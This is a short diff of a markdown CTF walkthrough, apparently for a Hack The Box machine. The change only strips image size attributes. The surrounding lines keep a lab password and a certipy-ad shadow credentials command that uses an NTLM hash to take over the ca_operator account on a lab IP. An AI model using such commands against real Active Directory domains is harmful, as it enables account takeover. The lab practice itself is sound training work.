@@ -320,8 +320,7 @@ Password: judith09**
 > **RUN: certipy-ad shadow auto -u management_svc@certified.htb -hashes
 > a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -ns
 > 10.10.11.41**
-> ![](images/media/image29.png){width="6.291666666666667in"
-> height="1.7243055555555555in"}
+> ![](images/media/image29.png)
 >
 > INFO: If not working, use NTP to synchronize your machine\'s clock
 >
